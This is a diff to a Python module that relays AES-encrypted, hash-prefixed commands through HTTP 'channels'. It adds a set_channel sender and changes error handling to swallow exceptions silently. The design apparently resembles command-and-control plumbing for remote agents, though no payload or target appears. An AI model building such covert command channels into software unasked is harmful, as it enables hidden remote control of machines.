@@ -4,7 +4,7 @@ import requests
 import base64
 import hashlib
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+from Crypto.Util.Padding import pad, unpad
 
 # In-memory dictionary to store channel data
 channels = {}
@@ -101,7 +101,7 @@ class HTTPCommandRelayClient:
 
 def get_channel(server_url, channel_id, enc_keys):  
     try: 
-        
+
         client = HTTPCommandRelayClient(server_url)
 
         res = client.get_channel(channel_id)
@@ -125,6 +125,30 @@ def get_channel(server_url, channel_id, enc_keys):
             return cmd
         
     except Exception as e:
-        print(e)
+        pass
     
     return None
+
+import random
+
+def set_channel(server_url, channel_id, enckeys, keyindex, cmd):
+    try:
+        if keyindex == -1:
+            keyindex = random.randint(0, len(enckeys) - 1)
+
+        key = enckeys[keyindex].key
+        iv = enckeys[keyindex].vector
+
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+
+        hashed_cmd = hashlib.sha256(str(cmd).encode()).digest()
+        encrypted_data = cipher.encrypt(pad(hashed_cmd+cmd.encode(), AES.block_size))
+        encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+
+        client = HTTPCommandRelayClient(server_url)
+        return client.set_channel(channel_id, str(keyindex) + ":" + encoded_data)
+
+    except Exception as e:
+        pass
+
+    return False
